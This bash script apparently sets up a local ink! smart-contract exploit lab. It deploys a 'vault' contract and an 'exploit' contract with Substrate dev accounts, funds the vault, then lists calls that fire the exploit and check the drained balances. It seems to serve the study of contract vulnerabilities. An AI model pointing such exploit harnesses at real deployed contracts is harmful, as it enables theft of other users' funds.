 #!/bin/env bash

build_exploit() {
    cd exploit
    cargo contract build
}

build_vault() {
    cd vault
    cargo contract build
}

deploy_vault() {
    cd vault
    cargo contract upload --suri //Alice -x >&2
    cargo contract instantiate --suri //Alice --skip-confirm -x | tee /dev/stderr | tail -1 | awk '{print $2}'
}

deploy_exploit() {
    cd exploit
    cargo contract upload --suri //Bob -x >&2
    cargo contract instantiate --args 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty $1 1000000 4 --suri //Bob --skip-confirm -x | tee /dev/stderr | tail -1 | awk '{print $2}'
}

build_exploit &
build_vault &
wait

vault_contract_id=$(deploy_vault)
exploit_contract_id=$(deploy_exploit "$vault_contract_id")

cat - <<EOF

vault address $vault_contract_id
exploit address $exploit_contract_id

fund vault contract

cargo contract call --contract $vault_contract_id --message deposit --value 1000000 --suri //Alice --skip-confirm
cargo contract call --contract $vault_contract_id --message deposit --value 1000000 --suri //Bob --skip-confirm
cargo contract call --contract $vault_contract_id --message deposit --value 1000000 --suri //Charlie --skip-confirm
cargo contract call --contract $vault_contract_id --message deposit --value 1000000 --suri //Dave --skip-confirm

deposit in vault contract from exploit contract
cargo contract call --contract $exploit_contract_id --message deposit --value 1000000 --suri //Bob --skip-confirm

execute exploit
cargo contract call --contract $exploit_contract_id --message exploit --gas 24897828145 --proof-size 463048 --suri //Bob --skip-dry-run

exploit contract balance
cargo contract call --contract $exploit_contract_id --message get_balance --suri //Bob --dry-run

view accounts balances

cargo contract call --contract $vault_contract_id --message balance --args 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY --suri //Alice --dry-run
cargo contract call --contract $vault_contract_id --message balance --args 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty --suri //Bob --dry-run
cargo contract call --contract $vault_contract_id --message balance --args 5FLSigC9HGRKVhB9FiEo4Y3koPsNmBmLJbpXg2mp1hXcS59Y --suri //Charlie --dry-run
cargo contract call --contract $vault_contract_id --message balance --args 5DAAnrj7VHTznn2AWBemMuyBwZWs6FNFjdyVXUeYum3PTXFy --suri //Dave --dry-run
(exploit contract balance in vault)
cargo contract call --contract $vault_contract_id --message balance --args $exploit_contract_id --suri //Bob --dry-run
EOF
